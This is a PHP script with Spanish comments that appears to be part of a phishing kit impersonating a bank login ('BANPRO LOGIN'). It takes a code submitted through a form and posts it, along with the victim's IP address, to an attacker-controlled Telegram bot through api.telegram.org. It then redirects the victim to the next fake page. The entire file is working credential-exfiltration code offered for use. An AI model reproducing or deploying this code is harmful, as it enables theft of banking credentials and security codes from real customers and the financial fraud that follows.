<?php
// Incluir config.php para cargar las variables $token y $chat_id
include('config.php');

// Verificar que el token y el chat_id estén configurados correctamente
if (isset($token) && isset($chat_id)) {
    // Obtener el dato del formulario
    $ips1 = isset($_POST['ips1']) ? $_POST['ips1'] : '';

    if ($ips1) {
        // Crear el mensaje
        $msg = "BANPRO LOGIN> IP: " . $_SERVER['REMOTE_ADDR'] . " - Código: " . htmlspecialchars($ips1);

        // URL de la API de Telegram
        $url = "https://api.telegram.org/bot$token/sendMessage";

        // Parámetros para enviar el mensaje
        $params = [
            'chat_id' => $chat_id,
            'text' => $msg
        ];

        // Opciones de configuración para la solicitud
        $options = [
            'http' => [
                'header'  => "Content-Type: application/json\r\n",
                'method'  => 'POST',
                'content' => json_encode($params),
            ]
        ];
        $context  = stream_context_create($options);

        // Enviar la solicitud
        $result = file_get_contents($url, false, $context);

        // Verificar si se envió correctamente
        if ($result === FALSE) {
            echo "Error al enviar el mensaje a Telegram.";
        } else {
            // Redirigir a otra página después de enviar el mensaje
            header("Location: 3.html");
            exit();
        }
    } else {
        echo "Código no recibido.";
    }
} else {
    die("Error: Configuración de token o chat_id incorrecta.");
}
?>
